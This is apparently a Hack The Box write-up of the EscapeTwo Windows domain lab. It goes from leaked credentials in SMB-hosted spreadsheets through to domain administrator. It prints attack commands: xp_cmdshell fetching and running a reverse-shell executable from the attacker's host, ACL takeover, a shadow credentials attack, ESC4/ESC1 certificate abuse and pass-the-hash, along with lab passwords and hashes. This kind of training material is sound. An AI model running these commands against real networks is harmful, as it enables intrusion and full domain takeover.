@@ -1,0 +1,149 @@
+Title: EscapeTwo
+Tag: HTB
+Date: 2025-01-01
+
+# Overview
+
+EscapeTwo was a Windows Active Directory box, starting with a set of low-privilege domain credentials (`rose`) handed out up front. An accessible SMB share held documents disguised with an `.xlsx` extension that were actually intact OOXML zip archives, and their embedded `sharedStrings.xml` leaked a plaintext credentials table, including the SQL Server `sa` account. Sysadmin-level SQL access allowed enabling `xp_cmdshell` for direct command execution, and a leftover SQL Server unattended-install configuration file on disk exposed the `sql_svc` service account password in plaintext, which turned out to be reused by the real domain user `ryan`. BloodHound enumeration from `ryan`'s context revealed a WriteOwner right over the `ca_svc` account, which was chained through ownership takeover and a DACL grant into a Shadow Credentials attack to recover `ca_svc`'s NT hash. That account's Cert Publishers membership then exposed an ADCS certificate template vulnerable to ESC4, allowing the template to be reconfigured into an ESC1-exploitable one and used to request a certificate impersonating the domain Administrator, yielding full domain compromise.
+
+## Recon
+
+```
+> nmap -T4 -p- --min-rate 2000 10.10.11.51
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+1433/tcp  open  ms-sql-s
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+```
+
+The service scan confirmed a Windows Server 2019 domain controller for `sequel.htb` (NetBIOS `SEQUEL`, host `DC01`), with Microsoft SQL Server 2019 also listening on 1433. No RDP port was open, but WinRM (5985) was, which stood out as a likely path for interactive access once valid credentials were found.
+
+## Domain Enumeration with enum4linux
+
+Authenticating as the provided `rose` account, `enum4linux -a` enumerated the domain over SMB/RPC. This surfaced the domain SID, a full user list (`Administrator`, `ca_svc`, `krbtgt`, `michael`, `oscar`, `rose`, `ryan`, `sql_svc`), the built-in and domain group structure, and several department-based groups (`Accounting Department`, `Sales Department`, `Management Department`, and others). `ryan` stood out as a member of `Remote Management Users`, meaning WinRM access would be possible once his credentials were known. Share enumeration listed several shares including a non-default one named `Accounting Department`, which `rose` was able to map and list.
+
+## Credential Leak via Fake XLSX Files on SMB
+
+Connecting to the `Accounting Department` share with `smbclient` and downloading its two files (`accounting_2024.xlsx` and `accounts.xlsx`) showed, via `file`, that they were valid zip archives rather than corrupted spreadsheets, which is expected since `.xlsx` is itself a zip-based OOXML format. Extracting them revealed the underlying XML parts, and `sharedStrings.xml` contained a plaintext table of names, emails, usernames, and passwords, including credentials for a SQL Server `sa` account:
+
+```
+sa / MSSQLP@ssw0rd!
+```
+
+## Foothold - MSSQL xp_cmdshell RCE
+
+With `sa` credentials in hand and MSSQL confirmed open, `impacket-mssqlclient` was used to authenticate. `xp_cmdshell` was disabled by default, so it was re-enabled through `sp_configure`:
+
+```
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+```
+
+With `xp_cmdshell` active, arbitrary commands could be run as the SQL service context. A Windows reverse shell executable was generated with `msfvenom`, hosted with a local Python HTTP server, and pulled onto the target and executed via `certutil`:
+
+```
+exec xp_cmdshell "powershell certutil -urlcache -f http://10.10.15.0:7575/test.exe C:\Windows\temp\test.exe; C:\Windows\temp\test.exe";
+```
+
+This caught a reverse shell, later upgraded with `powershell -nop -ep bypass`. The `xp_cmdshell`-enabled session periodically expired and needed reconnecting to keep issuing commands.
+
+## Credential Harvesting - SQL Server Install Configuration
+
+Enumerating the filesystem turned up a leftover installer directory at `C:\SQL2019\`, containing `sql-Configuration.INI`, the unattended configuration file used during the original SQL Server install. It included the service account and its plaintext password:
+
+```
+SQLSVCACCOUNT="SEQUEL\sql_svc"
+SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
+SAPWD="MSSQLP@ssw0rd!"
+```
+
+Checking the domain user `ryan` with `net user ryan` confirmed he was a real, active domain account and a member of `Remote Management Users`. The password recovered for the `sql_svc` service account turned out to also work for `ryan`, an instance of password reuse between a service account and a real user account.
+
+## Lateral Movement - WinRM as ryan
+
+```
+> evil-winrm -i 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'
+```
+
+This authenticated immediately, confirming `sequel\ryan` and granting access to the user flag.
+
+## BloodHound - Abusing WriteOwner on ca_svc
+
+`bloodhound-python` was run as `ryan` to collect the domain's AD structure and ACLs. Reviewing `ryan`'s outbound object control edges showed he held **WriteOwner** rights over the `ca_svc` account. Since the domain did not enforce blocking of implicit owner rights, taking ownership of `ca_svc` would let `ryan` also grant himself further rights over it.
+
+Impacket's `owneredit` was used to change the object's owner to `ryan`:
+
+```
+> impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb/ryan:WqSZAF6CysDQbGb3'
+```
+
+With ownership established, `dacledit` was used to grant `ryan` full control over the `ca_svc` object:
+
+```
+> impacket-dacledit -action write -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb/ryan:WqSZAF6CysDQbGb3'
+```
+
+## Shadow Credentials Attack - Recovering ca_svc's NT Hash
+
+With full control over `ca_svc`, a Shadow Credentials attack was carried out with Certipy, which adds a certificate-backed Key Credential to the target account and uses it to authenticate via PKINIT, without ever needing to reset the account's password:
+
+```
+> certipy-ad shadow auto -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3' -account 'ca_svc' -dc-ip '10.10.11.51'
+```
+
+This generated a certificate, added it as a Key Credential on `ca_svc`, authenticated as `ca_svc` to obtain a TGT, retrieved the account's NT hash, and then restored the original Key Credentials to avoid leaving a lasting artifact. The recovered hash was:
+
+```
+ca_svc: 3b181b914e7a9d5508ea1e20bc2b7fce
+```
+
+## AD CS Abuse - ESC4 to ESC1
+
+Using `ca_svc`'s recovered hash, `certipy-ad find` was run against the CA to check for vulnerable certificate templates. This flagged a custom template, `DunderMifflinAuthentication`, as vulnerable to **ESC4**: the `Cert Publishers` group, of which `ca_svc` was a member, held dangerous Object Control Permissions (Full Control, Write Owner, Write DACL, and Write Property) over the template itself.
+
+Because ESC4 grants effective control over the template's configuration, it was reconfigured into a template exploitable via **ESC1** (enrollee-supplied subject, allowing a requester to specify an arbitrary UPN):
+
+```
+> certipy-ad template -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -target dc01.sequel.htb -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -save-old
+```
+
+A certificate was then requested for the template while supplying the domain Administrator's UPN, with the CA's DNS explicitly passed since the request otherwise failed with a DNS-name-required error:
+
+```
+> certipy-ad req -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target dc01.sequel.htb -template DunderMifflinAuthentication -upn administrator@sequel.htb -dc-ip 10.10.11.51 -dns 10.10.11.51
+```
+
+The request succeeded and produced a certificate and private key pair bound to the Administrator's UPN.
+
+## Domain Admin - Certificate Authentication and Pass-the-Hash
+
+Authenticating with the issued certificate retrieved the domain Administrator's NT hash:
+
+```
+> certipy-ad auth -pfx administrator_10.pfx -domain sequel.htb
+[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
+```
+
+That hash was used directly for a pass-the-hash WinRM login as Administrator, completing the compromise:
+
+```
+> evil-winrm -i 10.10.11.51 -u administrator -H "7a8d4e04986afa8ed4060f75e5a0b3ff"
+```
+
+## Takeaways
+
+- Files with an office-document extension are worth inspecting at the byte level. OOXML formats like `.xlsx` are zip archives under the hood, and a mismatched or unusual file can still open cleanly as an archive and leak plaintext data through its internal XML parts, such as `sharedStrings.xml`.
+- Once `xp_cmdshell` can be enabled on a SQL Server instance with sysadmin-level credentials, it is a direct and reliable path to command execution as the SQL service context.
+- Unattended installation configuration files (like SQL Server's `sql-Configuration.INI`) often retain service account passwords in plaintext long after setup, and those passwords are frequently reused by real, human-operated domain accounts.
+- BloodHound-mapped ACL edges like WriteOwner are not dead ends: taking ownership of an object and then writing a new DACL onto it (via tools like Impacket's `owneredit` and `dacledit`) turns a narrow permission into full control.
+- Shadow Credentials attacks let an attacker with sufficient write rights over an account recover that account's NT hash by adding a certificate-backed Key Credential and authenticating via PKINIT, without touching or resetting the account's actual password.
+- ESC4 (dangerous write permissions over a certificate template's own configuration) is effectively a stepping stone: it lets an attacker reconfigure a template into one vulnerable to ESC1, after which any enrollable principal can request a certificate impersonating an arbitrary user, including a Domain Administrator.
